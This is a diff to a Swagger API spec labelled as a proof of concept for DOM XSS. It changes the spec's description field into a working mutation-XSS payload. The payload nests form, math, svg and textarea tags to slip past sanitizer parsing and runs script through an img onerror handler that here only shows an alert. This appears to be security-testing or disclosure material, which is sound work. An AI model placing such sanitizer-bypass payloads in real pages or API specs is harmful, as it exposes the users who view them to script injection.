@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": {
     "title": "TSI Poc - DOM XSS",
-    "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\\\"</textarea><img onerror=alert('XSS') src=1>\\\"></form>",
+    "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert('XSS') src=1>\"></form>",
     "version": ""
   },
   "basePath": "/tsiPoc",
